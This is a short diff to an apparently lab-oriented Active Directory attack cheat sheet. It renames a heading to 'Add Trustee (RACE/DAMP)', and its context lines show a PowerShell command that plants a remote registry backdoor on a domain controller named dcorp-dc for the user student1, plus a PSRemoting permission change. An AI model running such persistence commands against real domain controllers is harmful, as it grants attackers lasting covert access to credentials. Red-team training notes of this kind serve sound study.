@@ -249,7 +249,8 @@ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc
 -Remove
 ```
 
-__ (RACE/DAMP)__ - with admin privs on remote machine
+__Add Trustee (RACE/DAMP)__ - with admin privs on remote machine
+
 ```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
 ```
